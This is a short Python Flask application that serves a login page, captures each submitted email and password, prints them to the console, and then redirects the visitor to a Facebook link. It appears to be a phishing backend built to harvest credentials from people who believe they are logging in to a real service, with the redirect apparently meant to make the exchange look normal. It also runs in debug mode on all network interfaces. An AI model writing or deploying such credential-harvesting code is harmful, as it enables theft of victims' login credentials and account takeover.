from flask import Flask, render_template, request, redirect

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('login.html')

@app.route('/login', methods=['POST'])
def login():
    email = request.form['email']
    password = request.form['password']

    print(f"- Email: {email}\n- Password: {password}")

    return redirect("https://www.facebook.com/share/r/1FMP2u1BgZ/")

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)


